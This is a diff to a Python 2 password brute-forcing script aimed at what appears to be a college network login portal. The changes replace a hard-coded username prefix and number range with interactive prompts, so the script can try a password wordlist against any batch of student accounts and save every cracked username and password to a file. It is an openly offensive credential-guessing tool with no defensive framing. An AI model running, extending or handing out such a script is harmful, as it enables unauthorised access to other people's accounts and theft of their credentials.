@@ -11,9 +11,9 @@ import time
 import urllib
 import urllib2
 
-user_list = open("userlist.txt","a")
+user_list = open(raw_input("file name to store password =>\t")+".txt","a")
 pass_list = open("passwordlist.txt","r")
-user_name = "mec13"
+user_name = raw_input("branch with year like cse15 :=>\t")
 host_url = 'http://172.16.1.100:8090/httpclient.html'
 
 def connectivity():
@@ -26,8 +26,9 @@ def connectivity():
 	return False
 
 flag = True
-usernumber_min = 01
-usernumber_max = 70
+usernumber_min = input("min no.:=>\t")
+userminfix=usernumber_min
+usernumber_max = input("max no.:=>\t")
 
 if connectivity() == True:
 	while flag :
@@ -71,12 +72,12 @@ if connectivity() == True:
 			#----------------------------------------------------------------------------
 			if return_value != -1:
 				print '--->hurrah new pasword found user name is   Username: ',usernumber_min
-				user_list.write('Username:'+ user_name +str(usernumber_min)+' Password:'+passwd)
+				user_list.write(user_name +str(usernumber_min)+'\t'+passwd)
 				user_list.write("\n")
 			usernumber_min = usernumber_min  + 1
 		
 		time.sleep(2)
-		usernumber_min = 1
+		usernumber_min = userminfix
 else:
 	print 'No connectivity to host'
 
